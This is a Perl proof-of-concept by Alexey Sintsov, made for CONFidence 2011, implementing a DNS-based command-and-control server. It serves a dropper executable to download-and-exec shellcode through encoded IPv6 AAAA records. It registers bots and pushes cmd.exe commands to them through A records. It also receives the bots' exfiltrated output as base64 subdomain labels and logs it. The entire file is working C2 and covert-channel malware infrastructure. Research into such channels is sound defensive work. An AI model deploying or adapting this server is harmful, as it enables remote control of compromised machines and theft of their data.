#!/usr/bin/perl 
#
# DNS C&C example
#   by Alexey Sintsov
#   dookie _at_ inbox.ru
#   alex.sintsov _at_ gmail.com
#
#   Long memory for DSecRG team
#
# Special for CONFidence 2011, Krakow
#
# This DNS server used for reverse DNS Shellcode (download and exec)  and for C&C bot (VBS script that downloaded by shellcode)
#
#  P.S. Sorry - dirty coding and NOT user friendly iface 8)
#
#  UPD 2016: now reserved IPv6 used to bypass winapi restriction on resolving IPv6 without address assigned to the interface
#            Also maximum size of drop file has been extended up to 88Mb
#

 use Net::DNS::Nameserver; # Please can get from cpan
 use MIME::Base64;
 use Switch;               # Please can get from cpan 

 
 $EGG="drop.exe";                   # File to DROP (VBS DNS BOT)
 $defaultcmd="ipconfig";            # default bot command
 $DOMAIN="dom.ws";                  # domain !!! need to be changed
 $IPA="11.11.11.11";                # ip address of our server !!! need to be changed
 $timeout=60*10;                    # timeout
 ###############################################
 ###############################################
 
 $filBuff="";
 @array={};
 @cmd={};
 %array1 = ();
 $cmdReady=0;
 $rdc=0;
 @base64={};
 $autocmd=0;

 ##############
  print "\nDNS C&C PoC \nby Alexey Sintsov\n\n";
  
 ##############
 
 sub reply_handler {
     my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
     my ($rcode, @ans, @auth, @add);


    
     #$query->print;


     if ($qtype eq "A" && $qname eq "$DOMAIN" ) {
         my ($ttl, $rdata) = (360, "$IPA");
         push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
         $rcode = "NOERROR";
     }elsif ($qtype eq "A" && $qname eq "ns1.$DOMAIN"){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (3600, "$IPA");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");

    }elsif ($qtype eq "A" && $qname eq "ns2.$DOMAIN"){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (3600, "$IPA");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");

    }elsif (($qtype eq "CNAME")&& $qname =~ /(.*)\.$DOMAIN/){
    
              $rcode = "NOERROR";
              my ($ttl, $rdata) = (1,, "qwertyuiopasdfghjklzxcvbnm1234567890aaaaaaaaabbbbbbbbbcccccccc1");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
              print "CNAME request\n";
    }elsif (($qtype eq "AAAA" && substr($qname,0,1) ne "X") && $qname =~ /(.*)\.$DOMAIN/){
    
              $rcode = "NOERROR";
              if($array1{$1})
              {              
                if ($array1{$1}[0])
                {
                    ($ttl, $rdata) = (1,, $array1{$1}[0]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                }
              
                  if ($array1{$1}[1])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[1]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[2])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[2]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[3])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[3]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[4])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[4]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[5])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[5]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[6])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[6]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[7])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[7]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata"); 
                  }
                  
                 if ($array1{$1}[8])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[8]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[9])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[9]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[10])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[10]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[11])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[11]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[12])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[12]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[13])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[13]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                   }
                  
                  if ($array1{$1}[14])
                  {    
                    ($ttl, $rdata) = (1,, $array1{$1}[14]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[15])
                  {
                    ($ttl, $rdata) = (1,, $array1{$1}[15]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                  if ($array1{$1}[16])
                  {    
                    ($ttl, $rdata) = (1,, $array1{$1}[16]);
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                  }
                  
                                     
                }else{
                    ($ttl, $rdata) = (1,, "fff0:0000:0000:0000:0000:0000:0000:0000");
                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                }
                
                
                        
              print "Received query for download ($qname) from $peerhost to ". $conn->{"sockhost"}. "\n";
              
    }elsif (($qtype eq "A")&& $qname =~ /(.*)\.$DOMAIN/){
                $rcode = "NOERROR";
              
               
              #request handle 
              
              my $req=$1;
              my $fb = substr($req,0,1);
              my $sb = substr($req,1,1);
              my $len= length($req)-2;
              my $dat= substr($req,2,$len);
              my $answ="";
              my $seq="";
              
              my $datestring = date_format();
              
              if(substr($req,0,2) eq "XD")
              {
                $len-=4;
                $seq=substr($req,3,2);
                $dat=substr($req,6,$len);
                $answ="PDF-USERNAME: $dat";
                print "Received query with report ($qname) from $peerhost to ". $conn->{"sockhost"}. "\n";
                  print ".. nonencoded - username $dat\n";
               
              } elsif(substr($req,0,2) eq "XR") # Register bot
              {
                $len-=1;
                $name=substr($req,3,$len);
                $name =~ /\[(.*)\]\[(.*)\]/;
                
                $uname=$1;
                $udomain=$2;
                
                $answ= "Incoming BOT: $uname($udomain)";
                
                print "\n$answ\n";
                
                open (NEW,">dnsBOT.$uname.$udomain.txt");
                print NEW $defaultcmd;
                close(NEW);
                
                open (LOG, ">>DATA.log");
                print LOG "[$seq][$datestring][$peerhost][$qname][$answ]\n";
                close (LOG);
                
              }elsif(substr($req,0,2) eq "XE") # Report about shutdown
              {
                $len-=1;
                $name=substr($req,3,$len);
                $name =~ /\[(.*)\]\[(.*)\]/;
                
                $uname=$1;
                $udomain=$2;
                
                $answ= "Shutdown BOT: $uname($udomain)";
                
                print "\n$answ\n";
                    
                open (NEW,">dnsBOT.$uname.$udomain.txt");
                print NEW "exit";
                close(NEW);
                
                open (LOG, ">>DATA.log");
                print LOG "[$seq][$datestring][$peerhost][$qname][$answ]\n";
                close (LOG);
                
                
              }elsif(substr($req,0,2) eq "XG") # Get command
              {
                $name=substr($req,3,$len);
                $name =~ /\[(.*)\]\[(.*)\]/;
                $uname2=$1;
                $udomain2=$2;
                #print "XG $cmdReady [$uname2($udomain2)]==[$uname3($udomain3)]\n";        
                if("$uname3($udomain3)" eq "$uname2($udomain2)" && $cmdReady==1)
                    {
                        
                        push @ans, Net::DNS::RR->new("$qname 1 $qclass $qtype 1.1.1.1");
                        for (my $i=0;$i<=$#cmd;$i++)
                        {
                            my $iz=$i+1;
                            my ($ttl, $rdata) = (1,,"$iz.$cmd[$i]");
                            push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                        }
                        $cmdReady=2;
                        
                        print "COMMAND for $uname2($udomain2) = $command"."\n";
                        if($command eq "sleep" || $command eq "exit")
                        {
                            $cmdReady=0;
                        }else{
                            print "\nRecv. mode enabled";
                            print "\n";
                        }
                        
                        
                    }    
                    elsif($cmdReady==0)
                    {
                        $cmdReady=666;
                                        
                        my $no=0;
                        $len-=1;
                        
                
                        $uname3=$uname2;
                        $udomain3=$udomain2;
                        
                        $answ= "Command request BOT: $uname2($udomain2)";
                
                        print "\n$answ\n";
                        
                        
                        
                        if($autocmd==1){
                                open (NEW,"< dnsBOT.$uname2.$udomain2.txt") or $no=1;
                                if(!$no)
                                {
                                    read(NEW, $command, 66);
                                    close(NEW);
                                }
                            }else{
                                print "\n[COMMAND]\nfor $uname2($udomain2)\n\n#:>";
                                $command= <STDIN>;
                            }
                            
                            
                        chomp($command);
                            
                        if($command ne "sleep" && $autocmd==1)
                        {
                            open (NEW, ">dnsBOT.$uname2.$udomain2.txt");
                            print NEW "sleep";
                            close (NEW);
                                
                        }
                            
                        
                
                        open (LOG, ">>DATA.log");
                        print LOG "[$seq][$datestring][$peerhost][$qname][$answ]\n";
                        close (LOG);
                        
                
                        
                        $cmdLen=length($command);
                            
                        $conter=0;
                        $arr=0;
                        $cmdl="";
                        @cmd={};
                        for(my $i=0;$i<$cmdLen;$i++)
                        {
                            my $strZ=substr($command,$i,1);
                            my $byte=ord($strZ);
                            $cmdl.="$byte";
                            
                            if($conter==2)
                            {
                               $conter=0;
                               $cmd[$arr]="$cmdl";
                               #print "$cmdl\n";
                               $cmdl="";
                               $arr++;
                                  
                                   
                            }else{
                                $cmdl.=".";
                                $conter++;
                            }
                        }
                            
                        if($conter)
                        {
                            while($conter!=2)
                            {
                                $cmdl.="000.";
                                $conter++;
                            }
                                
                            $cmdl.="000";
                            $cmd[$arr]=$cmdl;
                            #print "$cmdl\n";
                        }
                                                    
                        $cmdReady=1;
                        alarm $timeout;
                        $old=0;
                    }else{
                    
                        if("$uname3($udomain3)" eq "$uname2($udomain2)"  && $cmdReady!=666)
                        {
                            $cmdReady=1;
                        }
                    
                    }
                
                
              }elsif(substr($req,0,2) eq "XX" && $cmdReady==2) # Bot report (one thread!!!)
              {
                $req=~/XX\.(.*)\.(.*)/;
                $seq=$1;
                $bas=$2;
                
                
                #print "XX\n";
                
                open (LOG, ">>DATA.log");
                print LOG "[$seq][$datestring][$peerhost][$qname][BASE64:$bas]\n";
                close (LOG);
                
                
                if($seq eq "FI")
                {
                    $base_64="";
                    if($old>0){
                        foreach $zx (@base64)
                        {
                                $base_64.=$zx;
                        }
                    }
                    $answ=decode_base64($base_64.$bas);
                    
                    
                    print "\n$answ\n\n";
                    print "\nRecv. mode disabled";
                    print "\n";
                    
                    open (LOG, ">>DATA.log");
                    print LOG "[$seq][$datestring][$peerhost][$qname][DECODED for $uname3($udomain3):\n$answ\n]\n";
                    close (LOG);
                
                    @base64={};
                    $cmdReady=0;
                    alarm 0;
                }else{
                    $old++;
                    print ".";
                    $base64[$seq]=$bas;
                }
                    
              
              }else{ # RAW DATA INPUT
                $seq= ((ord($fb)-0x61)<<4)+(ord($sb)-0x61);
              
                #print "\n\nHere is packet number ($fb)($sb)$seq:\n";
                $answ=chr(((ord($fb)-0x61)<<4)+(ord($sb)-0x61))."|||";              
                for(my $i=0; $i<$len; $i+=2)
                {
                
                    my $bh = (ord(substr($dat,$i    ,1))-0x61) << 4;
                    my $bl = ord(substr($dat,($i+1),1))-0x61;
                    my $bt = chr( $bh + $bl);
                    $answ.= $bt;
                }
                print "input data:\n[$answ]\n\n";
                open (LOG, ">>DATA.log");
                print LOG "[$seq][$datestring][$peerhost][$qname][$answ]\n";
                close (LOG);
              }
              #print "\n";
              
              
     }elsif ($qtype eq "A" && $qname =~ /(.*)$DOMAIN/){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (1,, "$IPA");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
                            
                            

     }elsif ($qtype eq "NS" && $qname =~ /$DOMAIN/){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (1,0, "ns1.$DOMAIN.");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
              ($ttl, $rdata) = (1,0, "evil.$DOMAIN.");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
             
    }elsif ($qtype eq "CNAME" && $qname =~ /$DOMAIN/){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (1,0, "$DOMAIN. mail.$DOMAIN. 9264777199 10800 1800 3600000 3600");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
             
    }elsif ($qtype eq "SOA" && $qname =~ /$DOMAIN/){
                $rcode = "NOERROR";
              my ($ttl, $rdata) = (1,0, "ns1.$DOMAIN. mail.$DOMAIN. 9264777199 10800 1800 3600000 3600");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
              ($ttl, $rdata) = (1,0, "ns1.$DOMAIN.");
              push @ans, Net::DNS::RR->new("$qname $ttl $qclass NS $rdata");

             
    }elsif( $qname eq "$DOMAIN" ) {
         $rcode = "NOERROR";
    } else{
                $rcode = "NXDOMAIN";
     }
     

     # mark the answer as authoritive (by setting the 'aa' flag
     return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
 }
 

 my $ns = Net::DNS::Nameserver->new(
     LocalAddr        => '0.0.0.0' ,
     LocalPort    => 53,
     ReplyHandler => \&reply_handler,
     Verbose      => 1,
 ) || die "couldn't create nameserver object\n";

 
 open (FILE, "<$EGG") or die 'cant open';
 
 $pk="aaaa";
 $pkc=$pk;
 $i=0;
 $byte=0;
 
 $size=0;
 $z=0;
 
 $tmpbyte="";     # current addr
 $addr_size = 0;  # addr size
 $block_size = 0; # block size flag
 @array = {};
 $two_bytes = ''; # temp buf
 $count = 0;
 
while (1) {
    $readed = read(FILE, $filBuff, 1);
    
    if (not $readed) #  Last byte happened already
    {
        print "last\n";
        if  ($count > 0){
            $pkc++;
        }
        $pk = join '', reverse split /(.)/, $pkc;
        $lenx = $addr_size * 2;
        if ($block_size == 1) # fill rest of block
        {
            print "1\n";
            $two_bytes.= "\0";
            $block_size = 0;
            $tmpbyte .= ":".unpack("H4",$two_bytes);
            $lenx--;
        }
        
        if  ($addr_size < 7) # fill rest of addr
        {
            print "2\n";
            for (;$addr_size<7;$addr_size++)
            {
                $tmpbyte .= ":0000"
            }
        }
        
        $address = "fff". ''. sprintf("%01X", $lenx) . $tmpbyte;
        $addr_size = 0;
        $array1{$pk}[$count]=$address;  # Addr added
        print "LAST $pk - $count  $address\n";
        $tmpbyte='';
        $count++;
        
        last;
        
    } else { # Read the byte
    
        $in_byte = $filBuff;
        $size++;
        
        
        if ($block_size==0) # new block
        {
            $two_bytes = $in_byte;
            $block_size = 1;
            $addr_size++;
        } elsif ($block_size==1) {
            $two_bytes.= $in_byte;
            $block_size = 0;
            $tmpbyte .= ":".unpack("H4",$two_bytes);
        } 
        
        if ($addr_size == 7 and $block_size == 0) # new addr
        {
            $address = "ff". ''.sprintf("%02X",($count*0x0e)) . $tmpbyte;
            $addr_size = 0;
            $array1{$pk}[$count]=$address;  # Addr added
            print "$pk - $count  $address\n";
            $tmpbyte='';
            $count++;
        } 
        
        if ($count == 17){
     
          $pkc++;
          $pk = join '', reverse split /(.)/, $pkc;
          $count = 0;
          if (length($pk)==5)
          {
            die("TOO BIG FILE, SORRY!");
          }
        }
    
    }
   
 }
 
 close (FILE);
 print "\n\nFile loaded... \nFILE SIZE = $size bytes\n\n";

 
 
 do{
    print "\n[MODE]\n1 - Auto command\n2 - Interctive command\nCTRL+C- change mode live\n\n#:>";
    $autocmd = <STDIN>;
    chomp($autocmd);
  }while($autocmd!=1 && $autocmd!=2);
 
 switch($autocmd){
    case 1    {
            print "\n[DEFAULT COMMAND]\nfor cmd.exe, ipconfig for example...\n\n#:>";
            $defaultcmd = <STDIN>;
            chomp($defaultcmd);
            print "\nAuto mode enabled.\n";
            }
    case 2    {print "\nInteractive mode enabled.\n";}
  }
  
 $SIG{'INT'}='INT_handler';
 $SIG{'ALRM'} = 'ALRM_handler';

 $ns->main_loop;
 
 
################################


sub date_format { 
    @_ = localtime(shift || time); 
    return ( sprintf ("%02d/%02d/%04d %02d:%02d:%02d",  $_[3], $_[4]+1, $_[5]+1900, @_[2,1,0] )); 
}


################################

sub ALRM_handler{

    print "Doh! BOT $uname3($udomain3) TIMEOUT!\n\n";
    $cmdReady=0;
    @cmd={};
    @base64={}; 
};
            
sub INT_handler {
    my($signal) = @_;

    if($autocmd==2)
        {
            print "\nAuto mode enabled. (cmd=$defaultcmd)\n";
            $autocmd=1;
            $cmdReady=0;
            @cmd={};
            @base64={};
        }else{
            print "\nInteractive mode enabled.\n";
            $autocmd=2;
            $cmdReady=0;
            @cmd={};
            @base64={};
        }
 

}


################################

